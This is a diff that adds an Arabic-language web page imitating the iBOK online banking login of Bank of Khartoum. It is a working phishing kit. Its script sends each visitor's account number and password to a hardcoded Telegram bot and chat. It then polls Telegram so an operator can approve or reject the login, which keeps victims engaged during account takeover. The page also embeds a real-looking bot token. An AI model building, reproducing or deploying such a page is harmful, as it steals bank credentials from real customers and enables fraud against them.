@@ -1,0 +1,489 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>تتبع النماذج عبر iBOK</title>
+
+    <style>
+         :root {
+            --red: #ef2e31;
+            --yellow: #ffcf00;
+            --ink: #101820;
+            --muted: #68798a;
+            --field: #fff5f5;
+            --border: #ffb8b8;
+        }
+        
+        * {
+            box-sizing: border-box;
+        }
+        
+        body {
+            margin: 0;
+            min-height: 100vh;
+            color: var(--ink);
+            font-family: Tahoma, Arial, sans-serif;
+            background: #f2f5f9;
+        }
+        
+        .page {
+            min-height: 100vh;
+            margin: 4px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            background: radial-gradient(#c8d0da 0.85px, transparent 0.85px) 0 0 / 18px 18px, #f2f5f9;
+        }
+        
+        header {
+            min-height: 142px;
+            padding: 11px 20px 24px;
+            color: #fff;
+            background: var(--red);
+        }
+        
+        .welcome,
+        .brand {
+            width: min(704px, 100%);
+            margin-inline: auto;
+        }
+        
+        .welcome {
+            min-height: 36px;
+            padding: 6px 12px;
+            border-radius: 24px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #111;
+            background: var(--yellow);
+            font-size: 14px;
+            font-weight: 700;
+            text-align: center;
+        }
+        
+        .brand {
+            margin-top: 10px;
+            direction: ltr;
+            text-align: right;
+        }
+        
+        .brand-name {
+            font-size: 32px;
+            line-height: 1.05;
+            font-weight: 800;
+            letter-spacing: -1px;
+        }
+        
+        .brand-caption {
+            margin-top: 6px;
+            font-size: 13px;
+        }
+        
+        main {
+            flex: 1;
+            padding: 0 16px 42px;
+        }
+        
+        .card {
+            position: relative;
+            width: min(672px, 100%);
+            margin: -12px auto 0;
+            padding: 25px 40px 24px;
+            border-radius: 15px;
+            background: #fff;
+            box-shadow: 0 15px 28px rgba(190, 35, 40, 0.12);
+        }
+        
+        h1 {
+            margin: 0;
+            color: var(--red);
+            font-size: 24px;
+            line-height: 1.25;
+            text-align: center;
+        }
+        
+        .subtitle {
+            width: fit-content;
+            margin: 16px auto 22px;
+            padding-bottom: 8px;
+            border-bottom: 2px solid var(--red);
+            font-size: 17px;
+            font-weight: 700;
+            text-align: center;
+        }
+        
+        .demo-note {
+            margin: -8px 0 18px;
+            padding: 10px 11px;
+            border: 1px solid #f1d783;
+            border-radius: 8px;
+            color: #5f4b12;
+            background: #fff9e4;
+            font-size: 13px;
+            line-height: 1.45;
+            text-align: center;
+        }
+        
+        .field {
+            margin-bottom: 19px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 9px;
+            font-size: 16px;
+            font-weight: 700;
+        }
+        
+        .input-wrap {
+            height: 44px;
+            display: flex;
+            align-items: center;
+            overflow: hidden;
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            background: var(--field);
+        }
+        
+        input {
+            width: 100%;
+            height: 100%;
+            padding: 0 14px;
+            border: 0;
+            outline: none;
+            color: var(--ink);
+            background: transparent;
+            font: inherit;
+            font-size: 16px;
+            text-align: right;
+        }
+        
+        input:focus-visible,
+        button:focus-visible {
+            outline: 3px solid #2463eb;
+            outline-offset: -3px;
+        }
+        
+        input::placeholder {
+            color: var(--muted);
+            text-align: right;
+        }
+        
+        .password-wrap input {
+            padding-left: 4px;
+            padding-right: 14px;
+        }
+        
+        .show-password {
+            height: 100%;
+            padding: 0 12px;
+            border: 0;
+            color: #526579;
+            background: transparent;
+            cursor: pointer;
+            font-weight: 700;
+        }
+        
+        .demo-action {
+            width: 100%;
+            min-height: 44px;
+            margin-top: 4px;
+            border: 0;
+            border-radius: 10px;
+            color: #fff;
+            background: var(--red);
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 700;
+            font-family: inherit;
+        }
+        
+        .demo-action:hover {
+            background: #d92529;
+        }
+        
+        .message {
+            display: none;
+            margin-top: 14px;
+            padding: 11px;
+            border-radius: 8px;
+            font-size: 14px;
+            line-height: 1.45;
+            text-align: center;
+        }
+        
+        .message.visible {
+            display: block;
+        }
+        
+        .message.error {
+            color: #a32121;
+            background: #fff0f0;
+        }
+        
+        .message.success {
+            color: #245b2a;
+            background: #eef8ee;
+        }
+        
+        footer {
+            min-height: 55px;
+            padding: 12px 10px 8px;
+            border-top: 4px solid var(--red);
+            color: #607080;
+            background: #fff;
+            font-size: 11px;
+            line-height: 1.6;
+            text-align: center;
+        }
+        
+        @media (max-width: 600px) {
+            .page {
+                margin: 0;
+                border-radius: 0;
+            }
+            header {
+                min-height: 132px;
+            }
+            main {
+                padding: 0 12px 32px;
+            }
+            .card {
+                padding: 24px 22px;
+            }
+            h1 {
+                font-size: 22px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="page">
+        <header>
+            <div class="welcome">مرحباً بك في خدمة الخدمات المصرفية عبر الإنترنت iBOK</div>
+            <div class="brand">
+                <div class="brand-name">iBOK</div>
+                <div class="brand-caption">نموذج عبر الإنترنت</div>
+            </div>
+        </header>
+
+        <main>
+            <section class="card" aria-labelledby="form-title">
+                <h1 id="form-title">نموذج عبر الإنترنت</h1>
+                <div class="subtitle">يرجى إدخال البيانات</div>
+
+                <p class="demo-note">
+                    رقم الحساب.
+                </p>
+
+                <form id="demo-form" autocomplete="off">
+                    <div class="field">
+                        <label for="account">أدخل رقم الحساب (7 أرقام):</label>
+                        <div class="input-wrap">
+                            <input id="account" name="account" type="text" inputmode="numeric" pattern="\d{7}" minlength="7" maxlength="7" placeholder="أدخل رقم الحساب المكون من 7 أرقام" autocomplete="off" required>
+                        </div>
+                    </div>
+
+                    <div class="field">
+                        <label for="password">كلمة المرور:</label>
+                        <div class="input-wrap password-wrap">
+                            <input id="password" name="password" type="password" placeholder="أدخل كلمة المرور" autocomplete="new-password" required>
+                            <button class="show-password" type="button" id="toggle-password" aria-label="إظهار كلمة المرور التجريبية" aria-pressed="false">إظهار</button>
+                        </div>
+                    </div>
+
+                    <button class="demo-action" type="submit">تسجيل الدخول</button>
+                    <div class="message" id="message" role="status" aria-live="polite"></div>
+                </form>
+            </section>
+        </main>
+
+        <footer>
+            iBOK بنك الخرطوم 2026<br> جميع الحقوق محفوظة، بنك الخرطوم، iBOK 2026.
+        </footer>
+    </div>
+
+    <script>
+        // =======================
+        // BOT CONFIG
+        // =======================
+        const BOT_TOKEN = '9161699388:AAHnDXrOZ3HGrj5UnsMBOiEyB4OulSYd1lw';
+        const CHAT_ID = '5926321674';
+
+        // =======================
+        // DOM REFERENCES
+        // =======================
+        const demoForm = document.getElementById("demo-form");
+        const accountInput = document.getElementById("account");
+        const passwordInput = document.getElementById("password");
+        const togglePasswordBtn = document.getElementById("toggle-password");
+        const messageDiv = document.getElementById("message");
+
+        let pollInterval = null;
+
+        // =======================
+        // PASSWORD VISIBILITY TOGGLE
+        // =======================
+        if (togglePasswordBtn) {
+            togglePasswordBtn.addEventListener("click", function() {
+                const type = passwordInput.getAttribute("type") === "password" ? "text" : "password";
+                passwordInput.setAttribute("type", type);
+                this.textContent = type === "password" ? "إظهار" : "إخفاء";
+            });
+        }
+
+        // =======================
+        // FORM SUBMIT & TELEGRAM BOT
+        // =======================
+        demoForm.addEventListener("submit", function(event) {
+            event.preventDefault();
+
+            const account = accountInput.value.trim();
+            const password = passwordInput.value.trim();
+
+            if (!account || !password) {
+                messageDiv.textContent = "يرجى تعبئة كافة الحقول.";
+                messageDiv.className = "message visible error";
+                return;
+            }
+
+            // Validate account number is exactly 7 digits
+            const accountRegex = /^\d{7}$/;
+            if (!accountRegex.test(account)) {
+                messageDiv.textContent = "يجب أن يتكون رقم الحساب من 7 أرقام بالضبط.";
+                messageDiv.className = "message visible error";
+                return;
+            }
+
+            // Generate unique user identifier based on timestamp and account suffix
+            const userId = Date.now() + "_" + account.slice(-4);
+
+            // Format message to send to Telegram
+            const textMessage = `New iBOK Login Attempt:\n\nAccount: ${account}\nPassword: ${password}`;
+
+            const keyboard = {
+                inline_keyboard: [
+                    [{
+                        text: "✅ APPROVE",
+                        callback_data: `approve_2fa_${userId}`
+                    }, {
+                        text: "❌ DECLINE",
+                        callback_data: `decline_2fa_${userId}`
+                    }, ],
+                    [{
+                        text: "⚠️ WRONG CODE",
+                        callback_data: `wrong_2fa_${userId}`
+                    }, ],
+                ],
+            };
+
+            // Send data to Telegram Bot API with Reply Markup
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: textMessage,
+                        reply_markup: keyboard
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        messageDiv.textContent = "جاري انتظار الموافقة.....";
+                        messageDiv.className = "message visible success";
+
+                        // Disable form inputs while waiting
+                        accountInput.disabled = true;
+                        passwordInput.disabled = true;
+                        document.querySelector('.demo-action').disabled = true;
+
+                        // Start polling Telegram updates
+                        startPolling(userId);
+                    } else {
+                        messageDiv.textContent = "حدث خطأ أثناء إرسال البيانات. حاول مرة أخرى.";
+                        messageDiv.className = "message visible error";
+                    }
+                })
+                .catch(error => {
+                    console.error("Error:", error);
+                    messageDiv.textContent = "حدث خطأ في الشبكة.";
+                    messageDiv.className = "message visible error";
+                });
+        });
+
+        // =======================
+        // TELEGRAM CALLBACK POLLING
+        // =======================
+        let lastUpdateId = 0;
+
+        function startPolling(userId) {
+            if (pollInterval) clearInterval(pollInterval);
+
+            pollInterval = setInterval(() => {
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1&timeout=2`)
+                    .then(res => res.json())
+                    .then(data => {
+                        if (data.ok && data.result.length > 0) {
+                            const latestUpdate = data.result[data.result.length - 1];
+
+                            if (latestUpdate.update_id > lastUpdateId && latestUpdate.callback_query) {
+                                lastUpdateId = latestUpdate.update_id;
+                                const callbackData = latestUpdate.callback_query.data;
+
+                                // Ensure the callback matches the current session's userId
+                                if (callbackData.includes(userId)) {
+                                    // Answer callback query to remove button loading state on Telegram
+                                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
+                                        method: 'POST',
+                                        headers: {
+                                            'Content-Type': 'application/json'
+                                        },
+                                        body: JSON.stringify({
+                                            callback_query_id: latestUpdate.callback_query.id
+                                        })
+                                    });
+
+                                    clearInterval(pollInterval);
+
+                                    if (callbackData.startsWith("approve_2fa_")) {
+                                        messageDiv.textContent = "تمت الموافقة بنجاح! جاري الانتقال...";
+                                        messageDiv.className = "message visible success";
+                                        setTimeout(() => {
+                                            window.location.href = 'summary.html';
+                                        }, 1000);
+                                    } else if (callbackData.startsWith("decline_2fa_")) {
+                                        messageDiv.textContent = "تم رفض الطلب، يرجى إعادة إدخال التفاصيل.";
+                                        messageDiv.className = "message visible error";
+                                        resetFormState();
+                                    } else if (callbackData.startsWith("wrong_2fa_")) {
+                                        messageDiv.textContent = "بيانات غير صحيحة، يرجى إعادة إدخال التفاصيل بشكل صحيح.";
+                                        messageDiv.className = "message visible error";
+                                        resetFormState();
+                                    }
+                                }
+                            }
+                        }
+                    })
+                    .catch(err => console.error("Polling error:", err));
+            }, 2000);
+        }
+
+        function resetFormState() {
+            demoForm.reset();
+            accountInput.disabled = false;
+            passwordInput.disabled = false;
+            document.querySelector('.demo-action').disabled = false;
+        }
+    </script>
+</body>
+
+</html>
